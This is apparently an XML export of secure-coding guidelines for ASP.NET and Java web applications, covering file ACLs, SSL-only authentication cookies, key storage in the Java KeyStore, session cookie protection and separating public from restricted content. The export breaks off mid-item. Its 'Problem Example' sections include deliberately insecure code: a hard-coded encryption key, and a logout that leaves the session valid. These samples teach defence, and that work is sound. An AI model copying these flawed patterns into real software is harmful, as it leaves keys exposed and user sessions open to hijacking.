&lt;p&gt;All ASP.NET applications can benefit from appropriate file ACLs.&amp;nbsp;ACLs should be established&amp;nbsp;in the&amp;nbsp;design&amp;nbsp;phase, prior to&amp;nbsp;implementing the application.&amp;nbsp;The&amp;nbsp;ACLs&amp;nbsp;are applied at deploy time.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;You need to configure the right access control lists (ACLs) for the right identities on your Web site files so that IIS and also ASP.NET file authorization control access to these files appropriately. You need to grant access to the following identities:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Your Web application identity.&lt;/strong&gt; If you are using a custom service account to run your ASP.NET application, you can grant the appropriate permissions to the IIS metabase and to the file system by running Aspnet_regiis.exe with the-&lt;strong&gt;ga&lt;/strong&gt;
 switch. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Your application's users.&lt;/strong&gt; ASP.NET file authorization performs access checks for file types mapped by IIS to the ASP.NET ISAPI extension (Aspnet_isapi.dll). If you are using Windows authentication, the authenticated user's Windows access
 token (which may be IUSR_MACHINE for anonymous users) is checked against the ACL attached to the requested ASP.NET file. If you are using forms authentication, access is checked against IUSR_MACHINE.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Use the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine the users/roles that need to access the application's resources.&lt;/strong&gt; Create a list of all roles in the application.&amp;nbsp;The Web application's process&amp;nbsp;identity and the application's users are the entities that&amp;nbsp;require access to application
 resources. If&amp;nbsp;a custom service account is being utilised to run&amp;nbsp;the ASP.NET application be sure to list it as well, it will need the appropriate permissions to the IIS metabase and the file system.&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Evaluate the level of access each user/role should have to use the application resources.&lt;/strong&gt; It is important to assign the minimum privilege level for all entities that access resources.&amp;nbsp; To do this create a table that contains roles on one
 axis and resources on another.&amp;nbsp; Within the&amp;nbsp;matrix cells describe the level of access each role will need for each resource (eg. Read Only, Read/Write, Full Access, etc.).&amp;nbsp; This is commonly called a subject/object matrix:&lt;/p&gt;
&lt;p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Objects&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Subjects&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;User Administration&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Page Content&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Admin&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Create, Delete, Modify&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Content Creator&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Create, Delete, Modify, Read&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Reader&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Read&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Anonymous&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Read&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply ACLs to enforce these restrictions.&lt;/strong&gt; To assign ASP.NET permissions to the&amp;nbsp;application's account, run the following command:&lt;/p&gt;
&lt;pre&gt;aspnet_regiis -ga MachineName\AccountName &lt;/pre&gt;
&lt;p&gt;Where MachineName is the name of your server or the domain name if you are using a domain account, and AccountName is the name of your custom account. When you run Aspnet_regiis.exe with the -ga switch, the command grants the following rights to the account:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Access to the IIS Metabase&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Permission to write to the %Windir%\Microsoft.NET\Framework\version\Temporary ASP.NET Files folder&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The account is also a member of the local Users group; therefore, it has read access to the \Inetpub directory tree (these directories have an ACL that grants read access to the Users group).&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;An Introduction to the IIS Metabase &lt;a href="http://support.microsoft.com/kb/240941/en-us"&gt;
http://support.microsoft.com/kb/240941/en-us&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Rules&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:bdff2308-96e1-4787-9162-a115d1366f76"&gt;Block Protected Files from being Retrieved&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:0def44d6-fea1-45a9-951c-79b54d549e5c"&gt;Restrict Access to Audit and Log Files&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>eb4c2562-d306-4aa0-a86c-630c5cdff1c6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Restrict Authentication Cookies to HTTPS Connections</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use the &lt;strong&gt;requireSSL&lt;/strong&gt; attribute to restrict authentication cookies to HTTPS connections only.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Sending cookies out exclusively over SSL makes it much harder for an attacker to sniff the cookie values off the wire.&amp;nbsp; If an attacker can get a copy of an authentication cookie, they can potentially emulate that user, compromising their account.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All systems which use authentication cookies should use SSL for those cookies if possible.&amp;nbsp; Systems which deal with any personally identifiable information or monetary transaction should use SSL in all circumstances without exception.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Set the &lt;strong&gt;secure&lt;/strong&gt; property of the authentication cookie to ensure that browsers only send authentication cookies over HTTPS connections.&amp;nbsp; By using SSL, you prevent an attacker from capturing the authentication cookie to gain spoofed access
 to your application.&amp;nbsp; Set the &lt;strong&gt;secure&lt;/strong&gt; property by using &lt;strong&gt;
requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &lt;strong&gt;&amp;lt;forms&amp;gt;&lt;/strong&gt; element as shown here.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;        requireSSL=&amp;quot;true&amp;quot; ... /&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An online brokerage provides a large amount of reference content.&amp;nbsp; As this content is not specific to any user and is publicly available, it is not protected by SSL for performance reasons like the trading interface is.&amp;nbsp; However, the site is not configured
 to restrict authentication cookies to SSL only, so they're sent with all requests.&amp;nbsp; An attacker positions themself on the same network segment as a user (someone using the public network in an internet cafe), sniffs the user's traffic, steals their cookie,
 and uses it to access their accounts.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An online brokerage provides a large amount of reference content.&amp;nbsp; As this content is not specific to any user and is publicly available, it is not protected by SSL for performance reasons like the trading interface is.&amp;nbsp; The site is&amp;nbsp;correctly configured
 to restrict authentication cookies to SSL only, so they're only sent with requests protected by SSL.&amp;nbsp; An attacker positions themself on the same network segment as a user (someone using the public network in an internet cafe) and sniffs the user's traffic,
 but because the cookies are only sent via SSL, they cannot retrieve them.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f12d5701-d706-47af-8c14-eaeeb4fad8e3</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use a Secure Key Storage Location</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Deployment Considerations</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Application keys should be stored in a well defined location, such as the Java KeyStore. Do not hard code them or store them as plaintext inside configuration files or source code.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;When faced with encryption, intruders attack the most vulnerable aspect: key management. Because keys are used to generate the encryption that protects sensitive data, the keys themselves become sensitive data that needs to be protected.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses encryption and encryption keys, use a secure storage location for the keys.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;When considering a key storage location:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the need for a key store. &lt;/strong&gt;Key stores should be used when your application utilizes crypto keys. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;KeyGenerator kgen = KeyGenerator.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;kgen.init(256);SecretKey skey = kgen.generateKey();&lt;br&gt;byte[] rawKey = skey.getEncoded();&lt;br&gt; SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use Java's KeyStore class. &lt;/strong&gt;Since version 1.2, Java offers a key store functionality as part of the Java Runtime Environment. The Java key store requires a master password for retrieving the contents of the key store. The master password
 should be given to the application at starting time. Use the KeyTool utility to create and manage the keys inside the key store. Example of accessing the key store:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String keyStoreName = MyApp.getKeyStoreName();&lt;br&gt;char[] keyStorePass = MyApp.getKeyStorePass();&lt;br&gt; KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());&lt;br&gt;FileInputStream keyStoreFile = new FileInputStream(keyStoreName);&lt;br&gt;keyStore.load(keyStoreFile, keyStorePass);&lt;br&gt;keyStoreFile.close();&lt;br&gt; final String keyName = &amp;quot;MyAppEncryptionKey&amp;quot;;&lt;br&gt;// Note: Although the example uses the same password for storing the KeyStore&lt;br&gt;// on disk and adding keys to the KeyStore, the 2 passwords can be different&lt;br&gt;// from one another&lt;br&gt;SecretKey skey = (SecretKey)keyStore.getKey(keyName, keyStorePass);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Protect the key store.&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Choose a key store directory&lt;/strong&gt;: Dedicate a directory for storing your application's key store files. Make sure the directory is not web-accessible. This limits the scope of users&amp;nbsp;who can potentially compromise the contents inside the directory.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Set appropriate permissions&lt;/strong&gt;: Apply filesystem permissions such that the key store files can be only accessed by your application and its administrators.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Avoid common mistakes.&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Do not hard-code keys in the application&lt;/strong&gt;: Hard-coding the encryption keys into the source code, hoping that an attacker will not reverse engineer the application, is security through obscurity. A determined attacker will usually find a
 way to defeat such a mechanism. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do not place keys into configuration files&lt;/strong&gt;: Obfuscating the encryption keys and placing them into configuration files is security through obscurity. A determined attacker will usually find a way to defeat such a mechanism.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Unload keys from memory after their use&lt;/strong&gt;: Leaving the encryption keys in memory after their final use allows the operating system to page them from memory and onto the hard drive. A determined attacker will usually find a way to obtain the
 encryption keys from the operating system's page file.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows a hard-coded encryption key inside the application. A determined attacker will be able to compromise the key once they gain access to the source code.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String encKey = &amp;quot;encryption key&amp;quot;;&lt;br&gt;MessageDigest md = MessageDigest.getInstance(&amp;quot;SHA-512&amp;quot;);&lt;br&gt;md.update(encKey.getBytes(&amp;quot;UTF-8&amp;quot;));&lt;br&gt;byte[] rawKey = md.digest();&lt;br&gt;md.reset();&lt;br&gt;SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code loads the encryption key from the Java key store. Because the key is properly stored, it is impossible for an attacker to steal the actual key without also stealing the master password.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String keyStoreName = MyApp.getKeyStoreName();&lt;br&gt;char[] keyStorePass = MyApp.getKeyStorePass(); &lt;br&gt;KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());&lt;br&gt;FileInputStream keyStoreFile = new FileInputStream(keyStoreName);&lt;br&gt;keyStore.load(keyStoreFile, keyStorePass);&lt;br&gt;keyStoreFile.close();&lt;br&gt; final String keyName = &amp;quot;MyAppEncryptionKey&amp;quot;;&lt;br&gt;// Note: Although the example uses the same password for storing the KeyStore&lt;br&gt;// on disk and adding keys to the KeyStore, the 2 passwords can be different &lt;br&gt;// from one another&lt;br&gt;SecretKey skey = (SecretKey)keyStore.getKey(keyName, keyStorePass);&lt;br&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about storing encryption keys using Java, see: Documentation for
&lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/java/security/KeyStore.html"&gt;
Class KeyStore&lt;/a&gt; in Java SDK.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:3D160166-FAEE-4B86-8972-654DC341E322"&gt;Attack: Weak Keystore Protection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB"&gt;Attack: Chosen Ciphertext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD"&gt;Attack: Chosen Plaintext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE"&gt;Guideline: Clear Sensitive Data from Memory when No Longer Used (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EA0D0F4E-A363-4777-9F0D-91E8C5042F9C"&gt;Guideline: Do Not Store Plaintext Sensitive Data (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:197029DD-4692-45C7-8EFF-B0E8760479BC"&gt;Guideline: Protect Sensitive Data Inside Configuration Files (Java Web Application)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f1ef60f9-6ec3-445d-a624-3a37c970ea41</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Session Cookies</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Session Management</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Protect the confidentiality of session cookies.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Session cookies are used by an application to identify the session associated with a particular user. Protecting session cookies can help prevent an attacker from hijacking the session and using the application as a legitimate user.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses cookies to maintain a user's session state, then use this guideline to protect the cookie.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to secure session cookies:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Do not allow users to choose their own session identifiers. &lt;/strong&gt;Java automatically assigns random IDs to its sessions which minimizes the risk of an attacker hijacking another user's session by using the same session ID. To use sessions in Java,
 invoke &lt;strong&gt;HttpServletRequest.getSession&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;HttpSession session = request.getSession();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Do not reuse sessions. &lt;/strong&gt;Always use clean sessions. This prevents old data (possibly from another user) from being disclosed and will help protect the privacy and integrity of user accounts. To create a fresh session, set the boolean flag
 in &lt;strong&gt;HttpServletRequest.getSession&lt;/strong&gt; to true:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;HttpSession session = request.getSession(true);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Time-out sessions. &lt;/strong&gt;Set an expiration time for sessions. This helps minimize the threat of session hijacking by giving an attacker a smaller window of opportunity. Depending on your application, an appropriate timeout can be anywhere from
 10 to 20 minutes. Setting when sessions should expire can be done through &lt;strong&gt;
HttpSession.setMaxInactiveInterval&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Allow users to terminate their sessions. &lt;/strong&gt;Allowing users to invalidate their sessions reduces the risk of session being hijacked. Use
&lt;strong&gt;HttpSession.invalidate&lt;/strong&gt; to accomplish this.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Track sessions through HTTP referrer. &lt;/strong&gt;Tracking sessions through HTTP referrer helps identify when&amp;nbsp;two users are&amp;nbsp;using the same session. In such cases, the session should be invalidated. To detect such behavior, pass the session ID through
 the URL. Monitor that all pages except the login screen contain the session ID in the HTTP Referer header. Although this technique does not prevent session hijacking completely, it can help minimize the risk of such attack.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure cookies are sent over encrypted channels. &lt;/strong&gt;Mark cookies sent over SSL as
&lt;strong&gt;Secure&lt;/strong&gt;. Use &lt;strong&gt;Cookie.setSecure&lt;/strong&gt; to require SSL when sending out the given cookie. It is recommended to avoid sending session cookies over unencrypted channels. Use
&lt;strong&gt;ServletRequest.isSecure&lt;/strong&gt; to verify whether SSL is being used.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; PCI DSS requirements state that sessions that are idle for 15 minutes should be locked automatically and require the user's password to unlock.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows the logout function of the &lt;strong&gt;LoginModule&lt;/strong&gt; used when relying on JAAS for authentication. The code removes all authentication tokens associated with the current session but fails to invalidate the session.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean logout() throws LoginException{&lt;br&gt;      subject.getPrincipals().remove(userToken);&lt;br&gt;      succeeded = false;&lt;br&gt;      commitSucceeded = false;&lt;br&gt; &lt;br&gt;      clearCredentials();&lt;br&gt;      userToken = null;&lt;br&gt;      // The application should have invalidated the session here.&lt;br&gt; &lt;br&gt;      // Log the logout event. Consult the Logging section for more details&lt;br&gt; &lt;br&gt;      return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code shows the logout function of the &lt;strong&gt;LoginModule&lt;/strong&gt; used when relying on JAAS for authentication. The code removes all authentication tokens associated with the current session and invalidates the session.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean logout() throws LoginException{&lt;br&gt;      subject.getPrincipals().remove(userToken);&lt;br&gt;      succeeded = false;&lt;br&gt;      commitSucceeded = false;&lt;br&gt; &lt;br&gt;      clearCredentials();&lt;br&gt;      userToken = null;&lt;br&gt; &lt;br&gt;      // The application invalidates the session when&lt;br&gt;      // the user is logging out&lt;br&gt;      HttpSession session = common.getCurrentSession();&lt;br&gt;      session.invalidate();&lt;br&gt; &lt;br&gt;      // Log the logout event. Consult the Logging section for more details&lt;br&gt; &lt;br&gt;      return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on HTTP sessions, see: Documentation for &lt;a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/HttpSession.html"&gt;
Interface HttpSession&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;For more information on HTTP cookies, see: Documentation for &lt;a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/Cookie.html"&gt;
Class Cookie&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;To learn more about parameter manipulation and ways to prevent it, see: &lt;a href="http://www.cgisecurity.com/owasp/html/ch11s04.html"&gt;
Parameter Manipulation&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about session prediction attacks, see: &lt;a href="http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml"&gt;
Credential and Session Prediction&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073"&gt;Guideline: Use SSL When Transmitting Credentials (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B"&gt;Attack: HTTP Session Hijacking Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035"&gt;Attack: Network Eavesdropping Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C7E4A74A-9557-43E4-8560-AD3193E3B9EE"&gt;Attack: Session Prediction Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2288423A-5696-41EA-A421-05EAD6460E4C"&gt;Attack: Cross Site Request Forgery&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:CBB29250-7ED3-4FDD-9B28-E3EE07EAF911"&gt;Attack: HTTP Replay Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:30448AA0-398E-43CC-A5A1-43A1CA27235E"&gt;Checklist Item: Session Cookies are Protected (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f44f4bc9-fb33-41f0-b356-ca73feb44176</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Partition Application Between Public and Private Domains</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Define a boundary between public and restricted content in both the URL namespace and the filesystem namespace.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Defining a boundary between public and restricted content simplifies the task of user authorization and is generally less prone to error. When the content is separated, server configuration can be used to automatically apply authorization rules without relying
 on the developer to explicitly add checks in the code.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Consider using this guideline when your application restricts access to specific resources. For instance, anonymous users are granted access to some, but not all of the application while authenticated users are granted access based on their role.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Defining the boundary requires: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine roles&lt;/strong&gt;: Define the various types of user and their rights. Build a security policy that documents the rights required to access each page of your application.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine pages that should require SSL&lt;/strong&gt;: This would include pages that transmit credentials, unprotected authentication cookies, or sensitive user information such as credit card or social security numbers. Such pages should be transmitted
 using SSL only.&lt;/p&gt;
&lt;p&gt;It should be noted that the Forms Authentication cookie is unprotected in the sense that it is vulnerable to HTTP Replay Attacks. As such, any page in a Forms Auth ASP.Net application that requires an authenticated user should only be accessible via SSL.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Structure the URL namespace&lt;/strong&gt;: Structure the application URL namespace to first separate the pages that require SSL from those that do not. Then define separate directories according to the various roles defined for your application. For instance
 you might have the following directories under your application root:&lt;/p&gt;
&lt;pre&gt;//secure/usr/secure/admin&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Configure IIS to require SSL on the appropriate portions of your application&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Right-click on 'My Computer' and select 'Manage &lt;/li&gt;&lt;li&gt;Under the 'Services and Applications' node, expand 'Internet Information Services' and locate your website
&lt;/li&gt;&lt;li&gt;Right click on the restricted folder and choose 'Properties' &lt;/li&gt;&lt;li&gt;Click on 'Edit' under the 'Secure Communications' section to require SSL connections. (NOTE: If you have not installed configured a certificate for this server, see the related section for steps to setup SSL on your IIS website)&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use absolute URLs to transition to or from the sensitive portion of the namespace&lt;/strong&gt;: Relative links use the same protocol (HTTP or HTTPS) as the current page. This can result in broken links that point to pages within your application that
